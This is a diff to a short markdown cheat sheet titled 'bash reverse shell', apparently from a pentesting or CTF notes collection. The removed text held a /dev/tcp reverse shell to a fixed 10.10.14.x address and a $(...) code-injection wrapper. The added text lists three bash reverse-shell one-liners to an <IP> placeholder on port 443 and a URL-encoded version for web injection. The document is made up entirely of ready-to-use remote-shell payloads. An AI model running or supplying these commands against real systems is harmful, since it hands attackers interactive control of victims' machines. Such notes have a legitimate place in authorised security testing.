@@ -1,8 +1,17 @@
-```
-/bin/bash -i >& /dev/tcp/10.10.14.106/1337 0>&1
+# bash reverse shell
+
+## common
+
+```bash
+/bin/bash -i >& /dev/tcp/<IP>/443 0>&1
+# or
+bash -l > /dev/tcp/<IP>/443 0<&1 2>&1
+# or
+bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
 ```
 
-e.g. if code injection is possible:
-```
-$(bash -c '/bin/bash -i >& /dev/tcp/10.10.14.211/1337 0>&1')
+## url encoded
+
+```bash
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F443%200%3E%261%22
 ```
